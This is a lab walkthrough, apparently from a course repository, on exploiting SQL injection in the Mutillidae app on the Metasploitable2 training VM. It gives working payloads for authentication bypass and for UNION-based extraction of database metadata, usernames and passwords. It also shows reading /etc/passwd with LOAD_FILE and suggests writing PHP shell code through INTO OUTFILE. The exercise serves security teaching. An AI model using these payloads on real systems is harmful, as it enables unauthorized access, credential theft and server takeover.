# Sqlinjection
Exploiting SQL Injection vulnerability

# AIM:
To exploit SQL Injection vulnerability using Multidae web application in Metasploitable2

## DESIGN STEPS:

### Step 1:

Install kali linux either in partition or virtual box or in live mode


### Step 2:

Investigate on the various categories of tools as follows:

### Step 3:

Open terminal and try execute some kali linux commands

## EXECUTION STEPS AND ITS OUTPUT:
SQL Injection is a sort of infusion assault that makes it conceivable to execute malicious SQL statements. These statements control a database server behind a web application. Assailants can utilize SQL Injection vulnerabilities to sidestep application safety efforts. They can circumvent authentication and authorization of a page or web application and recover the content of the whole SQL database. 
Identify IP address using ifconfig in Metasploitable2
## OUTPUT:
<img width="720" height="400" alt="1" src="https://github.com/user-attachments/assets/9228215e-7d2d-42e3-b292-19733ee0df44" />


Use the above ip address to access the apache webserver of Metasploitable2 from kali linux. In Kali Linux use the ip address in a web browser.
## OUTPUT:
<img width="1920" height="1200" alt="2" src="https://github.com/user-attachments/assets/98a1377a-9fe6-4780-bc81-bde348a55bb2" />


Select Multidae from the menu listed as shown above. You will get the page as displayed below:
## OUTPUT:
<img width="1920" height="1200" alt="3" src="https://github.com/user-attachments/assets/d1903707-d71b-46d4-9b3b-98ce4aaac383" />


Click on the menu Login/Register and register for an account
## OUTPUT:
<img width="1920" height="1200" alt="4" src="https://github.com/user-attachments/assets/f73af6d5-cee0-4db1-b6c7-0d56a1e2277d" />



Click on “Create Account” to display the following page:
## OUTPUT:




The login structure we will use in our examples is straightforward. It contains two input fields (username and password), which are both vulnerable. The back-end content creates a query to approve the username and secret key given by the client. Here is an outline of the page rationale:

($query = “SELECT * FROM users WHERE username=’$_POST[username]’ AND password=’$_POST[password]’“;). For the username put “ganesh” or “anything” and for the password put (anything’ or ‘1’=’1) or (admin’ or ‘1’=’1) then try to log in, and you’ll be presented with an admin login page. Click “Login”. 
## OUTPUT:
<img width="1920" height="1200" alt="5" src="https://github.com/user-attachments/assets/881ed7dc-bbbd-446b-8457-8be3a05b1836" />

## Bypassing login field

The username field is vulnerable. Put (blaise’ #) or (blaise’--) in the username field and hit “Enter” to log in. We use “#” or “--” to comment everything in the query sentence that comes after the username filed telling the database to disregard the password field: (SELECT * FROM users WHERE username=’admin’ # AND password=’ ‘). By using line commenting, the aggressor eliminates a part of the login condition and gains access. This technique will make the “WHERE” clause true only for one user; in this case, it is “blaise.”
Now after logging out you will see the login page. In the login page give blaise’ # . You can see the page now enters into the administrator page as before when giving the password.
## OUTPUT:
<img width="1920" height="1200" alt="6" src="https://github.com/user-attachments/assets/d5d2fe7f-e7f5-472d-b0d9-2c5943077812" />

Click the login button and you will see it enter into the administrator page
## OUTPUT:
<img width="1920" height="1200" alt="7" src="https://github.com/user-attachments/assets/ecb53eb2-1ed6-4ffb-b58f-83d6527831e8" />

## Union-based SQL injection
UNION-based SQL injection assaults enable the analyzer to extract data from the database effectively. Since the “UNION” operator must be utilized if the two inquiries have precisely the same structure, the attacker must craft a “SELECT” statement like the first inquiry. we will be using the “User Info” page from Mutillidae to perform a Union-Based SQL injection attack. Go to “OWASP Top 10/A1 — Injection/SQLi — Extract-Data/User Info”

After logging out, Now choose the menu as shown below:
## OUTPUT:
<img width="1920" height="1043" alt="8" src="https://github.com/user-attachments/assets/b428e9de-1d1d-4470-852b-a05a93ff941e" />
<img width="1920" height="1043" alt="9" src="https://github.com/user-attachments/assets/46b07fe1-d7f2-4165-9918-0191f1f39087" />
<img width="1920" height="1043" alt="10" src="https://github.com/user-attachments/assets/920bbd44-2992-4ee0-b6f7-b9d91b8b5500" />
<img width="1920" height="1043" alt="11" src="https://github.com/user-attachments/assets/f9838647-720c-466f-ad29-53b530508ef0" />

From this point, all our attack vectors will be performed in the URL section of the page using the Union-Based technique.There are two different ways to discover how many columns are selected by the original query. The first is to infuse an “ORDER BY” statement indicating a column number. Given the column number specified is higher than the number of columns in the “SELECT” statement, an error will be returned.

## OUTPUT:
<img width="1920" height="1043" alt="13" src="https://github.com/user-attachments/assets/332b5b38-3496-43ba-a421-f52351c37261" />

Since we do not know the number of columns, we start at 1. To find the exact amount of columns, the number is incremented until an error related to the “ORDER BY” clause is returned. In this example, we incremented it to 6 and received an error message, so it means that the number of columns is lower than 6.

The browser url of this info page need to be modified with the url as below:
http://192.168.56.103/mutillidae/index.php?page=user-info.php&username=vijay%27%23&password=&user-info-php-submit-button=View+Account+Details
## OUTPUT:
<img width="1920" height="194" alt="14" src="https://github.com/user-attachments/assets/e6af2814-c1f3-40f1-a8e0-a5809d908d91" />

After adding the order by 6 into the existing url , the following error statement will be obtained:
## OUTPUT:
<img width="1920" height="1043" alt="12" src="https://github.com/user-attachments/assets/98565470-e32f-451f-b900-6f5cb88fbf4a" />

When we ordered by 5, it worked and displayed some information. It means there are five columns that we can work with. Following screenshot shows that the url modified to have statement added with ordered by 5 replacing 6.
## OUTPUT:
<img width="1920" height="1043" alt="15" src="https://github.com/user-attachments/assets/5c63b61e-41bb-40d3-b97a-6fd2c7575cdb" />

 As it is having 5 columns the query worked fine and it provides the correct result
## OUTPUT:
![{5F441A13-6A10-4749-8CBA-4F8B2D54B171}](https://github.com/user-attachments/assets/1afd28d7-ba53-46a0-8f5d-fcb92345ea64)

Instead of using the "order by" option, let’s use the "union select" option and provide all five columns. Ex: (union select 1,2,3,4,5).
## OUTPUT:
<img width="1920" height="317" alt="17" src="https://github.com/user-attachments/assets/ecc3e4fa-f6b3-46c9-bcae-d5a10883ed2e" />

As given in the screenshot below columns 2,3,4 are usable in which we can substitute any sql commands to extract necessary information.
## OUTPUT:
<img width="1920" height="1043" alt="16" src="https://github.com/user-attachments/assets/8740c50b-ef49-45da-ac41-3ac7219b2f21" />

Now we will substitute some few commands like database(), user(), version() to obtain the information regarding the database name, username and version of the database.
http://192.168.56.103/mutillidae/index.php?page=user-info.php&username=vijay%27union%20select%201,database(),user(),version(),5%23&password=&user-info-php-submit-button=View+Account+Details
## OUTPUT:
<img width="1920" height="1043" alt="18" src="https://github.com/user-attachments/assets/d3d95be5-95b4-4023-a820-1f02efede00d" />

The url when executed, we obtain the necessary information about the database name owasp10, username as root@localhost and version as 5.0.51a-3ubuntu5.
In MySQL, the table “information_schema.tables” contains all the metadata identified with table items. Below is listed the most useful information on this table.

Replace the query in the url with the following one:
union select 1,table_name,null,null,5 from information_schema.tables where table_schema = ‘owasp10’
http://192.168.56.103/mutillidae/index.php?page=user-info.php&username=vijay%27union%20select%201,table_name,null,null,5%20from%20information_schema.tables%20where%20table_schema=%27owasp10%27%23&password=&user-info-php-submit-button=View+Account+Details
## OUTPUT:
<img width="1920" height="1043" alt="19" src="https://github.com/user-attachments/assets/cdcaf5f5-e844-46d7-9a58-1ff97212f2ba" />



The url once executed will  retrieve table names from the “owasp 10” database.

## Extracting sensitive data such as passwords 

When the attacker knows table names, he needs to discover what the column names are to extract data.

In MySQL, the table “information_schema.columns” gives data about columns in tables. One of the most useful columns to extract is called “column_name.”

Ex: (union select 1,colunm_name,null,null,5 from information_schema.columns where table_name = ‘accounts’).

Here we are trying to extract column names from the “accounts” table.

The column names of the accounts is displayed below for the following url:
http://192.168.56.103/mutillidae/index.php?page=user-info.php&username=vijay%27union%20select%201,column_name,null,null,5%20from%20information_schema.columns%20where%20table_name=%27accounts%27%23&password=&user-info-php-submit-button=View+Account+Details 

## OUTPUT:
<img width="1920" height="1043" alt="20" src="https://github.com/user-attachments/assets/d90bfb7c-cd37-4d43-8d33-e1e6b570adba" />

Once we discovered all available column names, we can extract information from them by just adding those column names in our query sentence.

Ex: (union select 1,username,password,is_admin,5 from accounts).
http://192.168.56.103/mutillidae/index.php?page=user-info.php&username=vijay%27union%20select%201,username,password,is_admin,5%20from%20accounts%23&password=&user-info-php-submit-button=View+Account+Details

## OUTPUT:
<img width="1920" height="1043" alt="21" src="https://github.com/user-attachments/assets/d74a653d-f237-4003-bee1-c40bb2985e89" />

## Reading and writing files on the web-server
We can use the “LOAD_FILE()” operator to peruse the contents of any file contained within the web-server. We will typically check for the “/etc/password” file to see if we get lucky and scoop usernames and passwords to possible use in brute force attacks later.

Ex: (union select null,load_file(‘/etc/passwd’),null,null,null).
http://192.168.56.103/mutillidae/index.php?page=user-info.php&username=vijay%27union%20select%20null,load_file(%27/etc/passwd%27),null,null,null%23&password=&user-info-php-submit-button=View+Account+Details
## OUTPUT:
<img width="1920" height="1043" alt="22" src="https://github.com/user-attachments/assets/f64e9846-0c2d-4d23-8520-af4b3609173b" />

the “INTO_OUTFILE()” operator for all that they offer and attempt to root the objective server by transferring a shell-code through SQL infusion. we will write a “Hello World!” sentence and output it in the “/tmp/” directory as a “hello.txt” file. This “Hello World!” sentence can be substituted with any PHP shell-code that you want to execute in the target server.
Ex: (union select null,’Hello World!’,null,null,null into outfile ‘/tmp/hello.txt’).


## RESULT:
The SQL Injection vulnerability is successfully exploited using the Multidae web application in Metasploitable2.
